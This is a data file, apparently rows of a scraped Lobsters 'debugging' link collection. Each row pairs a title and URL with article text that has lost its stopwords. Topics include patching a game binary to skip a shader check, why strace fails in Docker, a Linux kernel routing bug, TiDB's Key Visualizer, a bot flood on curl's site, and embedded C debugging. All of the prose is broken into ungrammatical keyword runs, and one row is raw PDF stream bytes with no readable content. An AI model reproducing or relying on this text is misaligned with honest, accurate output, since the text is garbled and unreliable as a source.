equivalent variable assembly architecture plenty somewhat distinct usage generally care much find detail know special register floating point also flag used comparison suchthe rest simply number written hexadecimals hopper reprocessed somewhat help see top procedure rightside panelwhich mean evaluates esp simply esp mean take value register esp add interpret memory address recap writing address string literal correct information extremely useless mean tricky bit reading assembly code figuring supposed head start know probably logging something expect function call log stuff let look aroundthere several similar call call instruction call procedure hopper would usually say sure happening basically setting argument function call click around different subcalls see stuff named namemangled function name printf enough indeed print thing care cleara step backwardat point completely lost track trying make game acknowledge graphic card indeed powerful enough run game let recap found place logging take place lucky also place code check setting graphic card capability thankfully lucky pretty good chance write article otherwise get bigger picture use hopper control flow graph feature break code little block draw arrow represent various jump much easier grok actual assembly often terribly orderour logging call middle terribly long function aaa game dothis point one would look around string literal hopper hint hoping find something give pointer eh see top procedure rest logging interesting bit forcing high setting pixel shader version havethe log hacked data said pixel shader version incompatible high setting code life bottomleft function squint see something peculiar highlighted terrible style truly time code high high medium low yes took hour seei highlighted blue block pixel shader version high logged highlighted similarity nice childfriendly coloursthe difference writing bunch place look suspiciously similar setting file earlier optiongrfxshaderquality setting well might know yet believe point could try several thing indeed cut short say almost word right thing figure pixelshader check failslet look branch logging block linear must beforesemver fan behold superior version format floating point numbersindeed right jb instruction jump instruction think goto conditional jump condition way assembly ifs work register flag briefly mentioned know usually simply look instruction one probably set flagthat instruction often cmp test ucomiss barbarian also easy google ucomiss compare instruction floating point explains floating point register make sense log say pixel shader version floating point valueso memory address hex data could leave dumbfounded know expect floating point let interpret floating point mean reasonable floating point value pixel shader version indeed microsoft used highlevel shading language directx shaders written age directx game even mac port us opengl also make sense high setting requires pixel shader version goodnow fix well compare instruction compare value set line movss dword movss special move instruction floatingpoint register writing bit whatever evalutes topresumably value like fix thisactually hackingwe finally ready way game high setting want take red path cfg skip wrong pixel shader version logic achieve making comparison succeed reversing jump condition one trick code setup deleting jump make u take red pathlet simply replace jump nop operation nothing simply delete add data executable us offset everywhere internally would break recommend switching cfg hopper kinda freak otherwise right see red bit hex window
77,Lobsters,debugging,Debugging,Why strace doesn't work in Docker,https://jvns.ca/blog/2020/04/29/why-strace-doesnt-work-in-docker/,strace nt work docker,container work email protected hypothesis container process missing capability reason reason arbitrary hypothesis something user namespaces email protected email protected hypothesis ptrace system call blocked seccompbpf rule list system call blocked docker default seccomp profile fix problem let look docker source code contribseccompseccompdefaultgo profilesseccompseccompgo default seccomp profile docker little say strace actually work newer version docker commit container work capability seccompbpf,editing capability page container work zine found trying explain strace work docker container problem run strace docker container laptop happens docker run binbash install strace email protected strace l strace ptrace ptracetraceme operation permitted strace work using ptrace system call ptrace allowed definitely gon na work pretty easy fix machine fix docker run capaddsysptrace binbash interested fixing wanted know happens strace work capaddsysptrace fix hypothesis container process missing capsysptrace capability always thought reason docker container process default capsysptrace capability consistent fixed capaddsysptrace right actually make sense reason reason experimentally regular user strace process run user check current process capsysptrace capability getpcaps capability reason man capability say capsysptrace capsysptrace trace arbitrary process using ptrace point capsysptrace let ptrace arbitrary process owned user way root usually need ptrace regular process owned user tested third way ran docker container docker run capaddsysptrace binbash dropped capsysptrace capability could still strace process even though capability anymore hypothesis something user namespaces next much le wellfounded hypothesis something along line um maybe process different user namespace strace work reason really coherent happened looked container process different user namespace well container email protected l proc nsuser l user host email protected l proc nsuser l user user namespace id root user container exact user root user host definitely reason able strace process created hypothesis make much sense realized root user docker container root user host thought interesting hypothesis ptrace system call blocked seccompbpf rule also knew docker us seccompbpf stop container process running lot system call ptrace list system call blocked docker default seccomp profile actually list allowed system call whitelist ptrace default whitelist come thing easily explains strace work docker container ptrace system call totally blocked course call strace would fail let verify hypothesis disable seccomp rule strace docker container docker run securityopt seccompunconfined binbash strace l execve binls l var work fine yes work great mystery solved capaddsysptrace fix problem still explained capaddsysptrace would fix problem man page docker run explains capadd argument way capadd add linux capability anything seccomp rule going let look docker source code documentation help thing go look source nice thing go dependency often vendored go repository grep repository figure code thing cloned githubcommobymoby grepped thing like rg capsysptrace think going containerd seccomp implementation contribseccompseccompdefaultgo bunch code make sure process capability also given access seccomp rule use system call go capability case capsysptrace ssyscalls append ssyscalls specslinuxsyscall name string kcmp processvmreadv processvmwritev ptrace action specsactallow args specslinuxseccomparg code seems something similar profilesseccompseccompgo moby default seccomp profile possible instead think answer capadd docker little say upshot seems capadd exactly say man page like capaddandalsowhitelistsomeextrasystemcallsifrequired make sense capability like capsysptrace supposed let use processvmreadv system call system call blocked seccomp profile going help much allowing processvmreadv ptrace system call give container capsysptrace seems like reasonable choice strace actually work newer version docker commit docker docker actually allow ptrace system call kernel version newer docker version laptop predates commit fun small thing investigate think nice example container made lot moving piece work together notcompletelyobvious way liked might like new zine called container work explains linux kernel feature make container work page read page capability seccompbpf zine
78,Lobsters,debugging,Debugging,Bug stories,http://beza1e1.tuxen.de/lore/index.html,bug story,,
79,Lobsters,debugging,Debugging,Hunting a Linux kernel bug,https://blog.twitter.com/engineering/en_us/topics/open-source/2020/hunting-a-linux-kernel-bug.html,hunting linux kernel bug,reverse path filter mesos network isolation routing local network packet debugging trie bug fix final fix selfcontained test case conclusion,earlier last year identified firewall misconfiguration accidentally dropped network traffic expected resetting firewall configuration fix issue resetting firewall configuration exposed kernel bug totally resetting firewall gave u default centos configuration block traffic except ssh bringing previously good firewall configuration nt fix default sysctl setting ran corner case kernel bug let take look mean happened understand happened need background different part stack linux reverse path filter mesos network isolation linux local packet routing reverse path filter reverse path filter mitigation ddos attack reverse routing table lookup incoming ip packet arrival interface source ip address lookup succeeds next hop device returned routing table match arrival interface packet accepted packet considered martian address dropped enters ip stack example loopback ip address subnet never appear hardware interface attached wire therefore identified martian dropped reverse path filter enabled default many linux distros mean sysctl set setting turn strict mode enables loose mode relaxes interface matching rule allowing packet nt match arrival interface received mesos network isolation many datacenter machine assign address per container instead host get address container get port range container configuration isolates entire tcpip stack network namespaces including routing table ip address well loopback interface used local network communication communicate container host create virtual ethernet pair container packet go one end pair come end pair port range based network isolation conceptually similar transport layer ip layer communication work whole stack normal particular explicitly bring back local network communication different container host isolation mesos us linux traffic control tc filter action move packet container host per based port turn somewhat complicated see linux routing table code nt high test coverage dealing loopback interface virtual ethernet pair another piece mesos background introduced port range based isolation using old kernel bug required u turn reverse path filter bug fixed continued set rpfilter nt strong reason change back routing local network packet ip layer two type local network packet flying around within host loopback packet whose destination address loopback address ie ip subnet packet routed virtual loopback interface per local routing table packet whose destination ip address owned host linux kernel optimizes case rerouting loopback interface virtual loopback interface automatically created kernel along loopback ip address routing entry subnet local routing table visible default another optimization every packet go loopback interface save routing information avoid another routing table lookup looping back ip stack information discarded virtual ethernet pair case respect network isolation even though routing table lookup could saved reason case one complication packet type packet loopback destination subnet nt considered routable unless theâ sysctl set type type packet still nt accepted routing table unless sysctl set see optimization saving routing information loopback packet actually built linux networking stack debugging necessary background let look bug firewall change caused initial outage first thing reset configuration bring centos default blocked incoming connection except ssh restored known good configuration however restarting firewall service reset sysctl setting particularly resetting curiously setting rpfilter prevented u routing local network packet properly debug host turned log martian packet saw recall routing local packet section type packet since source ip belongs host packet routed loopback interface expected rpfilter nt drop packet either strict loose mode dropped strict mode number place packet could dropped many inspect every possible line linux kernel code find offending code turned routing trace point via syskerneldebugtracingeventsfibenable highly suspicious line showed syskerneldebugtracingtrace fibtablelookup trace point routing table lookup fibtablelookupnh trace point right routing table lookup matching next hop device see routing table return next hop device instead loopback interface lo even though lookup done lo whose index cause rpfilter consider packet martian nt make sense next hop device local network packet lo correct loopback interface would nt selected egress indicates look detail linux routing table time ip address added network interface two routing entry automatically created linux kernel one routing entry ip subnet represents entire network one routing entry specific ip address local routing table latter one table interest prefix order match routing type marked local next hop device created routing table trie used speedup routing table lookup usually form longest prefix match algorithm routing entry specific ip address prefix added trie leaf since longest linux expose trie procnetfibtrie kernel lookup local routing table outgoing packet destination address specific routing entry match return next hop device following code path egress routing table lookup see linux kernel immediately amends next hop device loopback interface knowing local route likewise reverse routing table lookup returned clearly match incoming interface lo cause u fail strict rpfilter check bug fix final fix small line patch amends reverse routing table lookup similar way egress addition previous existing matching logic local route also allow packet pas filter arrival interface match loopback interface also added selfcontained test case make sure nt regression future conclusion learned linux route kind packet one corner case linux nt handling correctly thanks trace event saw get internal linux kernel state userspace without modifying source code kind thing often come handy want debug kernel bug performance tuning
80,Lobsters,debugging,Debugging,What can space botany teach us about debugging software?,https://chelseatroy.com/2020/04/16/lessons-from-space-debugging-plants/,space botany teach u debugging software,right roadmap plant space know plant distress piece debugging strategy standard strategy amateur plant nurturing strategy going cut mile earth surface veggie already plant production context nasa landsat data processing pipeline multispectral imaging hyperspectral imaging know code distress systematic literature review interesting talk code smell correlate bug fixing one fix numpy vectorization every dingdang data scientist think lesson learned studying history api design fill form liked piece might also like piece debugging strategy technical briefing time went deep determined sure like,reading time minutesi writing blog series software engineer learn spaceflight check post space series well spacerelated code post right talked roadmap plant space compared software engineering roadmaps today zoom science happening red talk teach u debugging usual start piece question seems first completely unrelated debugging know plant distress look wilted sad assume need water water fix try moving window work feeling brave repot feeling brave panic ask twitterfacebook wrong flow remind anything discussed bigger version image last time saw image piece debugging strategy call standard strategy break bigger version image turn plant get wilted brown need water also plant get wilted brown much water le understand going plant le effective standard strategy nursing back health strategy relies guess might wrong work guess inaccurate plant owner accidentally overwatered plant death point blood plant standard strategy hand would plant blood figurative concept hand amateur plant nurturing strategy going cut mile earth surface first plant evolved earth environment gravity greenhouse effect soil thing space harder survive second goal plant parent earth pretty simple plant little stress possible least fruiting plant since capacity limited space station spacecraft plant need earn keep producing much edible matter possible unstressed plant get leafy produce fruit lot plant get stressed direct energy away leaf toward fruit astronaut need space botanist want minimize stress want hit specific amount stress lot harder accomplish really good understanding plant need veggie team conducting experiment look leading indicator plant need something work grow plant deprive something like water introduce confirmed need take picture observe look different range electromagnetic spectrum look correlation confirmed need wavelength absorbing reflecting ersatz version kitchen window plant look green reflecting lot wave frequency eyeball perceive green usually mean healthy start reflect wave frequency eyeball perceive yellow get worried lot wavelength besides green yellow though addition color see wavelength either side see still object still absorb reflect use camera pick convert data wavelength image whose color see observe already plant production context example shown nasa landsat data processing pipeline nasa landsat satellite orbit earth collect data surface various range electromagnetic wavelength called band app allows researcher request data eventually process kind converting specific band color human see floating forest project take infrared band highly reflected kelp earth surface outside visible spectrum make bright green see kelp veggie determining whether nonvisible wavelength contain information plant know yet experiment u multispectral imaging capture band equipment cost ampedup version called hyperspectral imaging measure hundred different band camera run cool hundred grand looking early accurate sign plant stress taking eyeballing green yellow trick turning chelsea debugging glad asked started post asking question know plant distress software engineer botanist stick aloe vera since heard hard kill hope best focus code ah yes code thing know know code distress make code maintainable illegible buggy know whether going work resilient change think know idea constitutes good code bad code call evidence bad code code smell act like find junior programmer code systematic literature review collates finding sixteen study attempt measure correlation code smell bug study confirmed supposedly correlation smell studied bug code well dug study little bit unsurprisingly almost none study posse number sample would need requisite statistical power back claim make pretty normal software study honest also correlation equal causation empirical software engineer hillel wayne interesting talk studying impact software engineering practice comment video hint statistical rigor prioritized software study software engineer register result study conclude one weird trick make total h among finding make commenters tl drs hillel mention one code smell correlate bug fixing one fix maybe engineer team take step minimize code smell also take unstudied poorly understood step actually minimize code defect might code smell cause defect seen discussed tendency programming community pas around idea true without confirming last paragraph post discovered numpy vectorization every dingdang data scientist think lesson lesson much like lesson learned studying history api design lesson lot people think something mean true investigate learning rather take face value sometimes underlying truth interesting maybe would gain lot experimenting cause bug unlike plant code made human observing natural phenomenon additionally study need trend observational introduce defect code purpose study design might look something like make code identify confirmed defect upon identifying cause label cause relevant identifier like insufficient scope excessive scope two variable named thing typo dependency conflict et cetera figure kind way also look thing software working compare precedence look large difference precedence two group worth noting study design problem first idea could reliably yet second make multiple comparison one label would need lot example give study statistical power personal idea might run experiment though like said need lot example please fill form interested contributing bug example bank bugalog meantime though worth considering might apply experimental approach learning thing grow profession code base liked piece might also like piece debugging strategy complete alternative standard strategy technical briefing engineer bikini top nasa landsat data processing pipeline time went deep determined sure numpy vectorization every dingdang data scientist think like like loading
81,Lobsters,debugging,Debugging,spiermar/d3-flame-graph - A D3.js plugin that produces flame graphs from hierarchical data,https://github.com/spiermar/d3-flame-graph,plugin produce flame graph hierarchical data,brendan gregg post githubcombrendangreggflamegraph example source source getting started jsdelivr cdn npm node npm example input format burn interacting entry hierarchy api reference api function return flame graph object behavior specified function detail issue github issue contributing issue pull request build template input format license http,plugin produce flame graph hierarchical data nt know flame graph check brendan gregg post flame graph visualization profiled software allowing frequent codepaths identified quickly accurately generated using open source program githubcombrendangreggflamegraph create interactive svgs brendan gregg example click check demo source click check animated assembly demo source click check simplified demo blocksorg getting started jsdelivr cdn reference cdn hosted cs j file head link rel stylesheet type textcss href http head body div id chart div script type textjavascript src http script script type textjavascript src http script script type textjavascript var chart flamegraph width datajson function error data error return consolewarn error chart datum data call chart script body npm make sure node npm installed system install plugin npm install save use head link rel stylesheet type textcss href head body div id chart div script type textjavascript src script script type textjavascript src script script type textjavascript var chart flamegraph width datajson function error data error return consolewarn error chart datum data call chart script body detailed example example directory input format input stack simple hierarchical data structure json format name name value value child object burn cli tool convert multiple file format hierarchical data structure interacting entry internally data transformed hierarchy function like onclick label zoom expose individual entry hierarchy node wrap provided data add property data original userprovided object parent another hierarchy node child hierarchy node double size node fraction root double breaking change previous version based version library see api reference flamegraph create new flame graph flamegraphselfvalue enabled defines plugin use self value logic calculate node value flame graph frame size set true assume node value input callgraph represents internal node value self value sum child set false assume value includes chidren value default false explicitely set behavior flamegraphwidth size graph width px default set size specified set graph width otherwise return current graph width flamegraphheight size graph height px default number cell row time cellheight set size specified set cell height otherwise return current graph height minheight specified higher provided calculated value override height flamegraphminheight size minumum graph height px size specified higher provided calculated height override flamegraphcellheight size cell height px default set size specified set cell height otherwise return current cell height flamegraphminframesize size minimum size frame px displayed flame graph default set size specified set minimum frame size otherwise return current minimum frame size flamegraphtitle title title displayed top graph default empty set title specified set title displayed graph otherwise return current title flamegraphtooltip function set tooltip flamegraph frame tooltip function implement two method show hide called tooltip made visible hidden respectively show method take single argument flamegraph frame package includes simple tooltip function flamegraphtooltipdefaultflamegraphtooltip script type textjavascript src script var tip flamegraphtooltipdefaultflamegraphtooltip html function return name ddataname value ddatavalue flamegraphtooltip tip tooltip compatible default library version script src http script var tip attr class html function return name ddataname value ddatavalue flamegraphtooltip tip flamegraphtransitionduration duration specifies transition duration millisecond default duration duration specified return current transition duration see flamegraphtransitionease ease specifies transition easing function default easing function see flamegraphlabel function add function return formatted label example flamegraphlabel function return name dname value dvalue flamegraphsort enabled enablesdisables sorting child frame default true set sort ascending order frame name set function function take two frame b return frame le b greater equal value specified enabledisable sorting otherwise return current sort configuration flamegraphinverted bool invert flame graph direction topdown visualization flame graph also known icicle plot default false set value specified enabledisable inverted flame graph direction otherwise return current inverted configuration flamegraphcomputedelta bool enabled computes delta node delta value node sum value getdelta node function plus child default false set value specified enabledisable delta computation otherwise return current inverted configuration flamegraphresetzoom reset zoom everything visible flamegraphonclick function add function called user click frame example flamegraphonclick function consoleinfo clicked frame ddataname called argument onclick return click handler flamegraphsetdetailselement element set element updated focused sample detail text example div id detail div flamegraphsetdetailselement documentgetelementbyid detail called argument setdetailselement return current detail element flamegraphsetdetailshandler function set handler function called detail element need updated function receives single paramenter detail text set example flamegraphsetdetailshandler function detailselement detailselementinnerhtml else searchsum setsearchdetails else detailselementinnerhtml set setdetailshandler default function called argument setdetailshandler reset detail handler function flamegraphsetsearchhandler function set handler function called search result returned function receives three paramenters search result array search sample sum root value example flamegraphsetsearchhandler function searchresults searchsum totalvalue detailselement detailselementinnerhtml searchsum totalvalue sample format searchsum totalvalue set setsearchhandler default function called argument setsearchhandler reset search handler function flamegraphsetcolormapper function replaces builtin node color hash function function take two argument node data structure original color string node must return color string example purple highlighted otherwise original color flamegraphsetcolormapper function originalcolor return dhighlight originalcolor called argument setcolormapper reset color hash function flamegraphsetcolorhue string set flame graph color hue option warm cold red orange yellow green aqua called argument setcolorhue reset color hash function flamegraphsetsearchmatch function replaces builtin node search match function function take three argument node data structure search term optional boolean argument ignore case search third argument provided search casesensitive default function must return boolean example flamegraphsetsearchmatch function term true nonregex implementation search function return ddatanameindexof term called argument setsearchmatch return reset search match function flamegraphmerge sample merges current node given node flamegraphupdate sample update replaces current set node given node flamegraphdestroy remove flamegraph api function return flame graph object behavior specified function detail issue bug question discussion please use github issue contributing love contribution order avoid total chaos guideline found bug question feature request nt hesitate open issue working issue please comment assign code submit follow general pull request format fork repo make change submit pull request build plugin us webpack build system includes development server live refresh change start execute serve npm script git clone http cd npm install npm run serve template standalone template javascript cs inlined get built contains placeholder flamegraphparams need replaced stack format described input format license copyright martin spier right reserved licensed apache license version license may use file except compliance license may obtain copy license http unless required applicable law agreed writing software distributed license distributed basis without warranty condition kind either express implied see license specific language governing permission limitation license
82,Lobsters,debugging,Debugging,Debugging Distributed Systems,https://dl.acm.org/doi/pdf/10.1145/2927299.2940294,debugging distributed system,,obj endobj obj filterflatedecodeid index info rlength rsize stream b vɞ rxd endstream endobj startxref eof obj stream cc z 穱 f yt ˀ endstream endobj obj metadata rnames rpagelabels rpages rstructtreeroot rtypecatalogviewerpreferences endobj obj font procset pdftext xobject rotate typepage endobj obj stream l endstream endobj obj stream zg 绽řf endstream endobj obj stream endstream endobj obj stream l endstream endobj obj stream endstream endobj obj stream zc l endstream endobj obj stream l endstream endobj obj stream pz h endstream endobj obj stream u di endstream endobj obj stream g endstream endobj obj stream e e endstream endobj obj stream cq endstream endobj obj stream endstream endobj obj stream z xr l endstream endobj obj stream g x endstream endobj obj stream f ѹs b j endstream endobj obj subtypeform stream endstream endobj obj font procset pdftext structparents stream stream ө endstream endobj obj stream h x hfк α ȋ j r n q ߟ endstream endobj obj stream f n le u u eeuu w gzp pf q ix dslu endstream endobj obj stream k cv b k endstream endobj obj stream
83,Lobsters,debugging,Debugging,Key Visualizer: Observe Distributed Databases to Discover the Unknowns,https://pingcap.com/blog/observe-distributed-databases-to-discover-unknowns/,key visualizer observe distributed database discover unknown,challenging troubleshoot issue distributed database information system scattered different machine key visualizer newsql tidb key visualizer display system status graphically help database administrator dba quickly troubleshoot database performance issue enables user gain deep insight application key visualizer pingcap tidb hybrid transactional analytical processing key visualizer key visualizer help allow user observe system diagnose cluster issue key visualizer let user clearly observe system running status user even notsoexperienced one correctly diagnose system issue offer deeper insight application judging whether database fit application difficult offer insight application recommend improvement application known observe unknown bring possibility machine learning typical scenario identify bug discover application load change observe application health simulate scenario high traffic volume try master version deploy tidb tiup note roadmap tidb dashboard tidb usability challenge conclusion,seen database workload look like distributed database collection multiple machine logically interconnected physically spread different site computer network challenging troubleshoot issue distributed database information system scattered different machine kind system need global view system able observe system discover unknown answer following question quickly detect hotspot potential risk visually monitor runtime status find way predict whether distributed database run stably long time google cloud bigtable nonrelational nosql data storage system diagnostic tool called key visualizer generates visual report help user quickly identify hotspot could develop similar tool opensource newsql distributed database inspired google key visualizer implemented key visualizer keyviz tidb distributed relational newsql database key visualizer available tidb generally available later year tool us different color show access frequency traffic different area cluster key visualizer display system status graphically help database administrator dba quickly troubleshoot database performance issue enables user gain deep insight application key visualizer post deep dive key visualizer work help scenario applies dba database developer hope take knowledge apply work example developer could adopt tidb key visualizer application even design similar tool troubleshoot systemwhy key visualizer since april pingcap building tidb opensource distributed sql database support hybrid transactional analytical processing htap workloadsin tidb cluster node busy node mean hotspot exist cluster distributed database tidb automatically move data among node balance load within cluster sometimes application workload suddenly increase hotspot might occur trigger bottleneck node distributed architecture single node bottleneck could affect performance whole cluster therefore able quickly find root cause hotspot critical task database operation subsequent blog post introduce feature tidb mitigate hotspot auto scaling loadbased splittingfor tidb version earlier diagnosing hotspot issue tedious timeconsuming diagnostic process typically involves using various tool examine different component performing indepth analysis application logic specifically dba might check whether node cpu io usage balancedcheck hot table onebyone based cluster hot area listingsanalyze application logic hot table look hotspot causesand beginning troubleshooting lengthy process therefore need tool facilitate troubleshootingwhat key visualizer key visualizer visual diagnostic tool let user observe tidb cluster read write volume time key visualizer provides graphical representation application status concerned data privacy note data powering key visualizer nt contain confidential information applicationkey visualiser us heatmaps display read write traffic volume example key visualizer heatmap heatmap xaxis represents timethe yaxis represents key range mapping key range table indexesthe color represent read write volume key range brighter color higher read write volumethe following example demonstrate infer heatmap underlying workloadexample evenly distributed workload evenly distributed read writes heatmap bright dark color finegrained mix indicates read writes evenly distributed time among key range indicates workload evenly distributed nodesexample sequential read writes sequential read writes heatmap see bright line mean data read writes sequential typical scenario sequential data read writes importing data scanning table index example continuously write data table autoincrement idsnote key range correspond bright line hotspot usually performance bottleneckshow key visualizer help use key visualizer monitor health cluster however way powerful monitoring tool visual easytounderstand report key visualizer enables user easily diagnose cluster issue attain deeper knowledge application also take data powering key visualizer combine machine learning extract insight applicationsallow user observe system diagnose cluster issueskey visualizer let user clearly observe system running status user even notsoexperienced one correctly diagnose system issuestraditionally application developer dba nt clear global view database workload use metric like query per second qps transaction per second tps query execution time machine load cpu network disk etc infer running status database distributed architecture dig massive number metric useful informationsimilar way doctor use computed tomography ct find root cause symptom tidb user use key visualizer directly observe workload keyrange level clear view itoffer deeper insight applicationsmany database company face problem evaluating database specific application traditionally information available limited usually obtained asking question application qps tps readwrite ratio data size data distribution table schema typical query application developer many case metric nt known application developer sensitive share result judging whether database fit application difficultwith key visualizer evaluate whether tidb match application need record production traffic use key visualizer observe cluster status addition key visualizer visual report offer insight application recommend improvement applicationhere would like dive bit deeper difference monitoring observing system monitoring focus known metric cpu load memory tps qps however monitoring limited value reflects system specific scenario whether system reach capacity system become complex need observe system discover unknownsbring possibility machine learningby applying machine learning model data powering key visualizer could tap insight application example may able predict future application workload prepare capacity planning many possibility could imagined power observing systemtypical scenariosin section talk typical scenario key visualizeridentify bugswe want share real world story using key visualizer identify bug key visualizer able discover tidb bug tpcc benchmark test program one heatmap tpcc benchmarking read traffic tidb tpcc test heatmap see performance testing phase key visualizer demonstrated bmsqlneworder table hotspot read trafficaccording tpcc test model performance testing phase large amount sql statement reading index table however read traffic displayed heatmap much higher expectedthese abnormal behavior made u think might bug tidb code found optimizer implementation missing fixed bug average traffic index decreased tpcc performance improveddiscover application load changesthe load database could change slowly time example customer demand attention gradually shifted key visualizer observe application load granular level analyzing application load historical data quickly discover changing trend seize marketing business opportunitiesobserve application healthwith trend shifting microservice architecture system monitoring becomes increasingly challenging key visualizer observe change database load usually important component thus identify application anomaly timesimulate scenario high traffic volumewith key visualizer simulate scenario promoted sale anticipate future traffic pattern develop action plan handle situation similar traffic pattern appear production environment cope easily action plantry outif interested key visualizer follow step try one following already deployed tidb cluster launch master version placement driver pd managing component entire clusterif nt deployed tidb deploy tidb tiup run tiup playground nightly start tidb clustergo http get started key visualizernote modified pd default port need update port http actual pd portroadmapthe key visualizer opensource project located tidb dashboard key visualizer active development future plan preserve statistic key visualizer restartssupport tikvonly scenariosdifferentiate read write traffic heatmapoptimize calculation heatmap brightness make hotspot easier findyou welcome join u participating tidb usability challenge look forward contributionsconclusionit always challenge troubleshoot distributed sql database key visualizer tidb user observe system status quickly find performance issue cluster capture deep insight application also help tidb user identify change application thus discover new business opportunitieskey visualizer available tidb addition tidb provide dashboard let user check cluster topology runtime status operational parameter system log abnormal metric basic performance metric one place tidb dashboard help dba better understand system status significantly improve troubleshooting efficiency
86,Lobsters,debugging,Debugging,A QQGameHall storm,https://daniel.haxx.se/blog/2020/04/09/a-qqgamehall-storm/,qqgamehall storm,get deny deny level qqgamehall curl ca extract logging privacy analytics update update credit elia sch pixabay,mar get message frank curl irc channel freenode always hanging irc frank long time friend fellow frequent ircer channel time frank informs curl web site acting getting mailing list archive page go away reload weird unexpected important detail curl web site cdned fastly mean every visitor web site actually going one fastly server case get cached content server infrequently server come back origin server ask updated file send web site visitor error valid page good thing started checking log origin logging cdn level later could verify error log meaning caused misconfiguration cdn would perfectly legitimate url suddenly return go away reload get took look fastly management web interface spotted curl web site sending data unusual high speed moment average speed around typically average something going continued look answer thing noted log growing really rapidly post sent single url high frequency reqssecond would get data returned used useragent qqgamehall seems started within last hour post fastly basically always pas server could figure frank decided slow madness temporarily forbidding useragent access bot program whatever would notice start fail would course stop bombarding site deny ok quick deny useragent made server start responding request instead response sent back byte per request average bandwidth site immediately dropped back looking frank first seen due ratelimiting removed ratelmiting finally added block useragent screenshotted error rate fastly admin interface error per minute answer pretty simple search lot clue existed error log turned modevasive enabled since another heavy bot load attack back module rate limiting incoming request since lot request server come fastly limited set ip address crazy qq thing hitting u server would return every considered rate high whitelisted fastly request frank problem solved deny level bot traffic showed sign slowing easily request per second url get error back obviously care decided game little help moved blocking service fastly block useragent already traffic ever reach server phew server finally back regular calm state way stop followup graph grabbed little week since started blocking million blocked request counting graph show number requestshour axis peeking almost around requestssecond load course actually problem nuisance qqgamehall keep going error per hour period several day qqgamehall know friend twitter googling name informs u game launcher done tencent tried contact via twitter mean contacting otherwise seems even remotely likely work checked useragent post log suspect zero byte post url post ca cert bundle file provide curl ca extract web page one convert mozilla version pem user world enjoy someone seems enjoy maybe little much useragents seemed come mostly china seems add also look graph go could indicate eastern time zone program us libcurl harry curl channel found file virus total look think therefore highly likely storm caused application using curl theory sort service deployed upgrade shipped want get updated ca store get site request either get far often maybe large amount similar understand issue post though would done get would never noticed would fetched perfectly fine cached version feel free speculate logging privacy analytics logging cdn traffic curl site primarily also appreciate privacy gain user finally handling log volume pretty much requires separate service seem fairly pricey something really want therefore see source ip address thing yes ask fastly check tell really really wanted know also run analytics google otherwise site primarily privacy reason give data clue either update proposed could see ip address xforwardedfor header seems accurate course log header period consider starting better control info future update may flood diminished log show still block million requestsday service peaking requestsminute credit top image elia sch pixabay
87,Lobsters,debugging,Debugging,Debugging embedded C (1988),https://www.embedded.com/debugging-embedded-c/,debugging embedded c,view fullsize image view fullsize image view fullsize image view fullsize image view fullsize image view fullsize image wwwwhitesalmongroupcom continue reading,twenty year ago wrote article still sometimes get read good laugh know much changed since day debugging embedded c many respect easier basic step troubleshooting still however make bug repeatable isolate problem make correction retest interesting note recent experience programmer still make mistake tool better program become much larger think net loss overall become increasingly important organize project breaking manageable size thoroughly testing piece serious programmer adopt naming convention function variable use header file function prototyping choose coding style indenting stick discipline help tremendously integration especially working team even new tool disposal challenging eliminate bug large program careful organization lot testing strict attention detail achieve knoke debugging embedded c originally published november embedded system programming magazine correction final step debugging exercise sometimes bug eradication straightforward sometimes bug reflects conceptual design flaw debugging one series step necessary produce quality software consumes much programmer time yet one least discussed studied task software development process debugging described robert ward book debugging c que corp involves four phase testing stabilization localization correction testing exercise capability program stimulating wide range input value first program tested normal condition appears work handling special case boundary condition tested test carefully engineered force execution program branch thus ensure every decision node executed correctly peculiar performance program testing considered potential bug investigated stabilization second phase attempt control condition extent specific bug generated usually given set test condition cause bug appear bug remain even statement added source code see however certain class bug typical embedded c program difficult stabilize change source code linking process significantly alter bug behavior even make appear go away localization stage programmer move kill localization involves narrowing range possibility bug isolated specific variable segment code three general approach problemone approach construct hypothesis explain data might created modify experiment test validity hypothesis process localization employ scientific method problem solving requiring skill quite different needed generate code first place modifying experiment also cause bug behave differently another way localize bug singlestep suspect code watching carefully first sign abnormal behavior since programmer know supposed happen problem often pinpointed first time program problem technique tends tedious program contains loop complex structure quite often bug wo nt manifest singlestep execution bug also localized examining trace history executed code microprocessor emulator used capture trace program executes hardware breakpoints used stop execution desired trace history used reconstruct happened bug occurred correction final step bug located must eradicated often correction straightforward sometimes however bug reflects conceptual design flaw event bug corrected process start testing phase debugging program running supervision operating system quite different debugging program embedded system primary distinction available tool different operating system environment may support native debugger embedded system may system advantage native environment compiler source code debugger target program together one place program separate target monitor emulator code must moved back forth development system target advantage emulator provide hardware specifically designed facilitate debugging process following process typical software development effort specification embedded system program determined design program code edit program step may learn step compile program compiletime error occur localize find error return step link program linktime error occur modify link command relink necessary return step test program runtime error occur stabilize localize bug return step necessary go back step evaluate debugging tool need understand source potential bug karel robot john wiley son richard pattis cite four class bug lexical syntactic intent execution lexical syntactic bug identified compiler compile time intent execution bug identified testing program run timecompiletime error compiler make several pass code compilation actual number pass depends compiler compiler make three four bug usually discovered first two pass first pas made preprocessor expands macro read ineluded header file source file next pas parser lexical analyzer attempt understand produce cede source statement error message generated second pas following simple example compiletime error invalid preprocessor directive page illegal operator use illegal symbol identifier name byte j illegal punctuation character illegal language grammar incompatible type operation r r invalid symbol number int part bug result type error made programmer still learning c classified syntactical bug stabilizing bug nt issue since bug recurs time file compiled localization compiletime error usually fairly easy although occasionally bug open comment may require little work localize bug localized usually simple correct linktime error linker job connect hopefully tested module program build executable entity possible one module linked target program either test routine capable exercising target program stub module simulating section code yet written linktime error detected likely linker could nt find part library required build final program could nt understand object module representing program due incompatible format problem usually also reported compiler either case error command linker format object module bug program rarely library function name misspelled bug cause link error runtime error point programmer succeeded getting program compile accomplishment nt mean program free typo incorrectly formed statement simply mean compiler nt detect come difficult bug runtime bug exist without catastrophic program run wrong intent error cause program terminate abnormally execution error intent error occurs whenever program run normal completion produce incorrect result example intent error oneliner typematch boundary macro design bug simplest intent error oneliner syntactically correct statement error error usually caused incorrect assumption regarding operator precedence incorrect choice operator misplaced missing punctuation error call awshitical bug based muttering programmer spent considerable time staring right erroneous statement without seeing bug subclass intent bug dang wanted compare assign condition always true oops put semicolon statement effect body statement follow c getchar forgot operator precedence c meant write cgetchar boundary bug show test input designed test boundary beyondboundary condition program dealing array easy create boundary bug forgetting element array actually array uncommon even seasoned programmer occasionally generate invalid array index within loop especially loop complex outofbounds array indexing also cause viral bug described later boundary bug nt necessarily involve array variable limited range value test allowed beyond limit run listing contains two potential boundary bug view fullsize image machine implement ints requesting byte produce undesired result due signed comparison also zero byte requested 